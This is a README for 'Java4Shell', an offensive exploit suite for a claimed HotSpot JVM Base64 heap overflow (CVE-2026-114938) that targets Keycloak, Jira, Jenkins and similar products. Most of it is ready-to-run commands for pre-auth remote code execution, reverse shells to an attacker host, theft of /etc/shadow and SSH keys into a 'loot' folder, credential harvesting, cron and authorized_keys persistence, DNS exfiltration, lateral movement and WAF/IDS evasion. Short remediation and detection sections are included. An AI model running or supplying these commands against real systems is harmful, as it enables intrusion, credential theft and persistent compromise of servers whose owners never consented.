<p align="right">
  <a href="README.md"><b>English</b></a> •
  <a href="README.pt-BR.md"><b>Português (Brasil)</b></a>
</p>

<p align="center">
  <a href="README.md"><img src="https://img.shields.io/badge/Language-English-blue?style=for-the-badge" alt="English"></a>
  <a href="README.pt-BR.md"><img src="https://img.shields.io/badge/Language-Português-green?style=for-the-badge" alt="Português"></a>
</p>

# Java4Shell — CVE-2026-114938 — Full Exploit Suite

> **Ethical Notice:** This tool was developed exclusively for authorized penetration testing,
> red teaming, and offensive security research. Only test systems you have explicit,
> written permission to target. Unauthorized access is illegal.

---

## References and Sources

| Source | Link |
|--------|------|
| Original Advisory | [calif.io/java4shell](https://calif.io/java4shell/) |
| Reference PoC | [github.com/scadastrangelove/java4shell](https://github.com/scadastrangelove/java4shell/tree/main) |
| NVD Entry | [CVE-2026-114938](https://nvd.nist.gov/vuln/detail/CVE-2026-114938) |
| Tenable Plugin | [Java4Shell Plugin](https://www.tenable.com) |
| SecurityOnline | [cve-watchtower/cve-2026-114938](https://securityonline.info/cve-watchtower/cve-2026-114938/) |

---

## What is Java4Shell

**CVE-2026-114938** is a critical heap out-of-bounds write in the optimized Base64 decoder
intrinsic (`AVX-512 VBMI`) within the HotSpot JVM. Discovered and published by Calif.io in November 2026.

| Attribute | Details |
|-----------|---------|
| CVSS v4.0 | **9.2 Critical** |
| CVSS v3.1 | 8.1 High |
| CWE | CWE-122 (Heap-based Buffer Overflow) |
| Component | `java.util.Base64` (AVX-512 VBMI HotSpot JVM intrinsic) |
| Impact | Memory leak ("JavaBleed") + Pre-auth Remote Code Execution (RCE) |
| Affected JDKs | 17.0.6+, 21.x, 25.x, 27.x (unpatched builds) |
| Affected CPUs | x86-64 with AVX-512 VBMI (Intel / AMD) — ARM64 is **unaffected** |
| Discovered By | [Calif.io](https://calif.io/java4shell/) |

### Root Cause Analysis

The AVX-512 VBMI vectorized intrinsic computes the decoded output buffer length as:

```
out_len = (in_len * 3 / 4) - trailing_padding_count
```

When processing a 64-byte aligned chunk (AVX-512 lane boundary) with misplaced `=` padding
characters, this computation suffers an **integer underflow**. The negative value is
interpreted as a full-width vector store mask, writing ~62–63 bytes past the allocated
buffer boundary into adjacent Java heap memory (**heap out-of-bounds write**).

### Complete Exploitation Chain

```
OOB Write (CVE-2026-114938)
        ↓
    Heap Grooming         → Positions a byte[] adjacent to the corrupted buffer
        ↓
    Type Confusion        → Corrupts the `length` field of the adjacent array
        ↓
    Arbitrary R/W         → Over-length array enables arbitrary heap read/write
        ↓
    Post-Exploitation     → cmd | shell | bleed | persist | filerd | creds
                            privesc | dns_oob | screenshot | ssrf | lateral
```

---

## Affected Products

### Confirmed Pre-Authentication RCE
| Product | Primary Vector / Endpoint |
|---------|--------------------------|
| Keycloak | SAML SSO endpoint |
| Atlassian Jira | REST API Basic Auth |
| Atlassian Confluence | SAML plugin + REST endpoints |
| Jenkins | API Basic Auth + Groovy console |
| JFrog Artifactory | API Basic Auth |
| PingFederate | SAML POST binding |

### Post-Authentication RCE
| Product | Primary Vector |
|---------|----------------|
| Apache Kafka (REST Proxy) | JSON body parsing |
| Apache Solr | Admin API |
| Elasticsearch | Bulk API |
| Gerrit | REST API `/a/` prefix |
| Spinnaker | Gate API |

---

## Tool Structure

```
java4shell/
├── java4shell_scanner.py        # Fast vulnerability scanner (non-destructive)
├── java4shell_exploit.py        # Full exploit suite & post-exploitation framework
├── java4shell_mass_scan.py      # Multi-target concurrent scanner
├── selftest.py                  # Self-validation test suite (zero external dependencies)
├── mock_vulnapp.py              # Pure-Python mock server (tests without Docker/JDK)
├── smoke_oob_test.py            # End-to-end integration smoke test
├── docker-compose.yml           # Vulnerable Docker lab (VulnApp + Keycloak + Jenkins)
└── modules/
    ├── targets.py               # Target application profiles (13 applications, including vulnapp)
    ├── fingerprint.py           # JDK, GC, AVX-512 VBMI, and application fingerprinting
    ├── heap_oracle.py           # Heap layout analysis and GC boundary mapping
    ├── grooming.py              # GC-specific heap spray engine (G1GC, ZGC, Shenandoah)
    ├── exploit_core.py          # OOB write trigger, scalar fallback, type confusion & heap R/W
    ├── calibrate.py             # Build-specific offset calibration (--mode calibrate)
    ├── http_utils.py            # User-Agent rotation pool (16 browsers/clients) & adaptive jitter
    ├── report.py                # Structured Markdown and JUnit XML report generator
    └── post/
        ├── cmd_exec.py          # OS command execution (SpEL, OGNL, Groovy)
        ├── reverse_shell.py     # Reverse shell payloads (bash, python, nc, java, PowerShell)
        ├── javableed.py         # JVM heap memory dump & credential harvesting
        ├── persistence.py       # Persistence mechanisms (cron, systemd, registry, etc.)
        ├── file_read.py         # Arbitrary filesystem file retrieval
        ├── cred_dump.py         # Multi-target configuration & credential extraction
        ├── privesc.py           # Privilege escalation discovery (SUID, sudo, kernel, containers)
        ├── dns_oob.py           # DNS Out-of-Band exfiltration beacon & integrated listener
        ├── screenshot.py        # Display capture via java.awt.Robot and native screen utilities
        ├── ssrf_scan.py         # SSRF internal network pivoting & cloud metadata discovery
        └── lateral.py           # Lateral movement probes (SSH, Redis, Docker, databases)
```

---

## Requirements

- Python **3.10+**
- Zero external dependencies — pure standard library (`urllib`, `ssl`, `concurrent.futures`, `socket`, `struct`)

---

## Vulnerability Scanner (Non-Destructive)

### Single Target

```bash
python java4shell_scanner.py https://jira.target.internal
```

### Multiple Targets

```bash
python java4shell_scanner.py https://jira.internal https://keycloak.internal https://jenkins.internal
```

### With JSON Report and Verbose Output

```bash
python java4shell_scanner.py https://target.com --output report.json --verbose
```

### WAF Evasion (Adaptive Probe Jitter)

```bash
# Random delay 0–300ms between probes — blends with legitimate traffic
python java4shell_scanner.py https://target.com --jitter 300
```

### Mass Scan (Input File)

```bash
python java4shell_mass_scan.py targets.txt --target-threads 20 --output mass_report.json
```

---

## Full Exploitation Suite

### Syntax

```
python java4shell_exploit.py <TARGET_URL> [-O <OBJECTIVE>] [--mode {exploit,calibrate}] [options]
```

> **Note:** When running with `--mode calibrate`, the `-O` objective argument is optional.

### Post-Exploitation Objectives (`-O`)

| Objective | Description | Required Flags |
|-----------|-------------|----------------|
| `cmd` | Execute a single OS command | `--command` |
| `shell` | Spawn an interactive reverse shell | `--lhost` `--lport` |
| `bleed` | JavaBleed: dump JVM heap memory & harvest credentials | — |
| `persist` | Install persistence mechanisms | `--lhost` `--lport` |
| `filerd` | Read arbitrary filesystem files | — |
| `creds` | Comprehensive credential dump (env, config, JVM props) | — |
| `privesc` | Privilege escalation discovery (SUID, sudo, kernel, docker) | — |
| `dns_oob` | DNS out-of-band exfiltration beacon | `--oob-domain` |
| `screenshot` | Server display screen capture via java.awt.Robot | — |
| `ssrf` | Internal network pivoting & cloud metadata scan | — |
| `lateral` | Lateral movement probes (SSH, Redis, Docker, DB) | — |
| `all` | Sequentially execute all post-exploitation modules | — |

---

## Usage Examples

### Build Offset Calibration (`--mode calibrate`)

Sweeps 64 Base64 payload sizes (3B to 192B) across 3 anomalous padding variants to map heap OOB landing offsets prior to exploitation:

```bash
# Full sweep with spray tuning and offset recommendations
python java4shell_exploit.py http://localhost:8088 --profile vulnapp --mode calibrate --verbose

# Pipe structured JSON summary to file for automated pipelines
python java4shell_exploit.py http://localhost:8088 --profile vulnapp --mode calibrate 2>calibration.json
```

### Credential Harvesting on Keycloak (Auto-Detect)

```bash
python java4shell_exploit.py https://keycloak.target.com -O creds
```

### Reverse Shell with Integrated Listener on Jenkins

```bash
python java4shell_exploit.py https://jenkins.target.com -O shell \
  --lhost 10.10.14.5 --lport 4444 --listen --profile jenkins
```

### Execute OS Command (Jira, Force JDK 17 + G1GC)

```bash
python java4shell_exploit.py https://jira.target.com -O cmd \
  --command "id && hostname && cat /etc/passwd" \
  --jdk-version 17 --gc G1GC
```

### JavaBleed — Heap Memory Extraction

```bash
python java4shell_exploit.py https://target.com -O bleed \
  --dump-rounds 20 --dump-output heap_dump.txt
```

### Persistence (Cron + Authorized Keys)

```bash
python java4shell_exploit.py https://target.com -O persist \
  --lhost 10.10.14.5 --lport 4444 \
  --mechanisms cron authorized_keys \
  --ssh-pubkey "ssh-rsa AAAA... attacker@kali"
```

### Arbitrary File Retrieval

```bash
python java4shell_exploit.py https://target.com -O filerd \
  --files /etc/passwd /root/.ssh/id_rsa /etc/shadow \
  --output-dir ./loot
```

### Complete Exploit Chain with JSON Report

```bash
python java4shell_exploit.py https://target.com -O all \
  --lhost 10.10.14.5 --lport 4444 \
  --output exploitation_report.json \
  --verbose
```

### Privilege Escalation Discovery

```bash
python3 java4shell_exploit.py https://target.com -O privesc --profile keycloak
```

### DNS Out-of-Band Exfiltration Beacon

```bash
python3 java4shell_exploit.py https://target.com -O dns_oob \
  --oob-domain <token>.burpcollaborator.net \
  --listen-port 1053
```

### Internal SSRF Pivot & Cloud Metadata Scan

```bash
python3 java4shell_exploit.py https://target.com -O ssrf --profile spring
```

### Lateral Movement Probing (SSH + Redis + Docker)

```bash
python3 java4shell_exploit.py https://target.com -O lateral \
  --lateral-creds admin:password123 root:toor \
  --ssh-key /home/kali/.ssh/id_rsa
```

---

## Local Docker Test Environment

> Requires Docker Engine ≥ 24.0 with Compose v2. Base image: `eclipse-temurin:21-jdk` (~477MB).

```bash
cd /home/kali/Documents/java4shell

# Start the vulnerable application container (port 8088 to avoid local 8080 conflicts)
docker compose up -d vuln-app

# Monitor startup logs (javac compilation + JVM boot ~15s)
docker compose logs -f vuln-app
# Wait for: [VulnApp] Listening on :8080

# Verify container health
curl http://localhost:8088/health
# → {"status":"UP"}

# Manually verify the decode-error behavioral signal
curl -s -X POST http://localhost:8088/api/decode \
  -H "Content-Type: application/json" \
  -d '{"data":"QUFBQUFBQUFB="}' | python3 -m json.tool
# → {"result": "[decode error: Input byte array has wrong 4-byte ending unit]"}

# Run pre-exploit offset calibration
python3 java4shell_exploit.py http://localhost:8088 --profile vulnapp --mode calibrate --verbose

# Run vulnerability scanner
python3 java4shell_scanner.py http://localhost:8088

# Run exploit (on hosts without AVX-512 VBMI: aborts after type_confusion=False, expected behavior)
python3 java4shell_exploit.py http://localhost:8088 \
  --profile vulnapp -O creds --warmup 50

# Teardown lab environment
docker compose down
```

> **Note on hosts without AVX-512 VBMI:** The exploit confirms `oob_triggered=YES`
> via the decode-error signal, but safely aborts before post-exploitation because
> `type_confusion=False`. On CPUs featuring physical AVX-512 VBMI instructions
> (Intel Skylake-X+, Ice Lake+, AMD Zen 4+), the vector memory corruption triggers
> and yields `type_confusion=YES`, unlocking full post-exploitation.

---

## Supported Target Profiles

| `--profile` | Application | RCE Path |
|-------------|-------------|----------|
| `keycloak` | Keycloak IAM | Pre-auth |
| `jira` | Atlassian Jira | Pre-auth |
| `confluence` | Atlassian Confluence | Pre-auth |
| `jenkins` | Jenkins CI/CD | Pre-auth |
| `artifactory` | JFrog Artifactory | Pre-auth |
| `pingfederate` | PingFederate SSO | Pre-auth |
| `kafka` | Apache Kafka REST Proxy | Post-auth |
| `solr` | Apache Solr | Post-auth |
| `elasticsearch` | Elasticsearch | Post-auth |
| `gerrit` | Gerrit Code Review | Post-auth |
| `spring` | Spring Boot (Generic) | Pre-auth |
| `spinnaker` | Spinnaker CD | Post-auth |
| `vulnapp` | VulnApp (Local test harness) | Pre-auth |

> Omitting `--profile` triggers automatic detection via HTTP response headers and body fingerprinting.

---

## Exploit Tuning Options

| Flag | Default | Description |
|------|---------|-------------|
| `--mode` | `exploit` | `exploit`: full chain + post-ex; `calibrate`: offset sweep and optimal payload recommendation |
| `--jdk-version` | auto | Force JDK major version (17, 21, 25, 27) |
| `--gc` | auto | Force Garbage Collector (G1GC, ZGC, Shenandoah, ParallelGC) |
| `--attempts` | 5 | Maximum core exploit trigger attempts |
| `--groom-threads` | 20 | Concurrent threads for heap grooming spray |
| `--skip-groom` | — | Skip grooming phase (faster execution, reduced reliability) |
| `--skip-oracle` | — | Skip heap layout oracle analysis |
| `--warmup N` | 0 | Send N benign Base64 requests to prime JIT compilation (recommended: 50–500 on non-VBMI hosts) |
| `--jitter MAX_MS` | 0 | Introduce random 0–MAX_MS ms delays between requests for WAF/IDS evasion |
| `--timeout` | 15s | HTTP request timeout in seconds |

---

## Exploit Phases

### Phase 1 — Fingerprint
Identifies target application profile, JDK version, active GC, host AVX-512 VBMI presence
(`/proc/cpuinfo`), GC region sizing, and object header layout. When AVX-512 VBMI is absent,
the suite automatically engages the **scalar fallback trigger** (3-byte chunk anomalous padding).

### Phase 2 — Heap Oracle
Sends requests of varying allocation sizes to map heap region boundaries through GC latency
analysis, extracting heap metadata from JVM error messages where possible.

### Phase 3 — Heap Grooming
Sprays controlled `byte[]` allocations to reliably position a victim array directly
adjacent to the buffer targeted for the OOB write. Tailored by GC algorithm:
- **G1GC**: Eden region saturation + fine alignment
- **ZGC**: Small page allocation fill (2MB)
- **Shenandoah**: Region saturation (256KB)

### Phase 3.5 — JIT Warmup (Optional, `--warmup N`)
Dispatches N benign Base64 requests to ensure `Base64.Decoder.decode0()` is compiled by
HotSpot's C2 JIT compiler. Without warmup, uncompiled interpreted bytecode does not engage
vector intrinsics.

### Phase 4 — OOB Write & Type Confusion
Delivers the weaponized trigger payload. Evaluates whether the adjacent array's `length`
field was overwritten. Retries up to `--attempts` times with inter-attempt re-grooming.

> **Safety Gate:** If `oob_triggered=False`, exploitation safely aborts with diagnostics.
> If `oob_triggered=True` but `type_confusion=False` (normal on hosts without AVX-512 VBMI),
> the framework halts before post-exploitation to prevent unstable blind execution.

### Post-Exploitation
Executes requested objectives via application-native sinks (SpEL, OGNL, Groovy console,
or native Runtime.exec). Only reachable when heap R/W is confirmed (`type_confusion=True`).

---

## Persistence Mechanisms

| Mechanism | Operating System | Privilege Required |
|-----------|------------------|--------------------|
| `cron` | Linux | Root (`/etc/cron.d`) or user crontab |
| `systemd` | Linux | User (rootless) |
| `bashrc` | Linux | User (rootless) |
| `rc_local` | Linux | Root |
| `authorized_keys` | Linux | User (rootless) |
| `schtasks` | Windows | User / Administrator |

---

## Detection Payload Mechanics

Attack surfaces evaluated by the scanner:

| Surface | Injection Method |
|---------|------------------|
| `HTTP-Basic-Auth` | `Authorization: Basic <payload>` |
| `Bearer-Token` | `Authorization: Bearer <payload>` |
| `Multipart-Upload` | MIME multipart/form-data body |
| `JSON-Body` | `data` field in JSON POST request |
| `SAML-SSO` | `SAMLRequest` parameter in form/URL |
| `Query-Param` | `?data=<payload>` URL parameter |

Behavioral vulnerability indicators:

| Signal | Confidence | Description |
|--------|------------|-------------|
| Connection Reset / RemoteDisconnected | **High** | Immediate JVM process crash from memory violation |
| `hs_err_pid`, `SIGSEGV`, `Exception in thread` | **High** | JVM fatal error diagnostic strings in response |
| HTTP 500 with stack trace | **Medium** | Unhandled server exception during decode parsing |
| `{"result":"[decode error: ...]"}` in JSON body | **Medium** | Malformed padding processed prior to exception |
| Latency ≥ 5× baseline (min. 40ms absolute) | **Low** | Heap GC stall induced by OOB write pressure |
| Empty response body on status < 400 | **Low** | Abnormal socket termination during response flush |

---

## Remediation Guidelines

### Definitive Patch
Upgrade the target JDK to patched releases (Oracle Critical Patch Update, Nov 2026):

| JDK Major | Minimum Patched Version |
|-----------|-------------------------|
| 17 | `17.0.21.1+` |
| 21 | `21.0.13.1+` |
| 25 | `25.0.5.1+` |
| 27 | `27.0.1.1+` |

### Temporary Workarounds (x86-64 Only)

Disable Base64 compiler intrinsics:
```bash
-XX:-UseBASE64Intrinsics
```

Or restrict vector extensions to AVX2 (disables AVX-512 VBMI instructions):
```bash
-XX:UseAVX=2
```

> ⚠️ **Do not** apply `-XX:UseAVX=2` on ARM64 hosts — the JVM will fail to start due to unrecognized flags.

### WAF and Perimeter Controls
Cloudflare, AWS WAF, and Azure WAF maintain inspection signatures for malformed Base64 patterns.
WAF rules provide defense-in-depth but do not replace JVM patching.

**Suite Evasion Features:**
- `--jitter MAX_MS` — Introduces randomized request spacing to evade rate-limiting and behavioral WAF rules
- Automatic User-Agent rotation across a pool of 16 legitimate browser and enterprise client strings
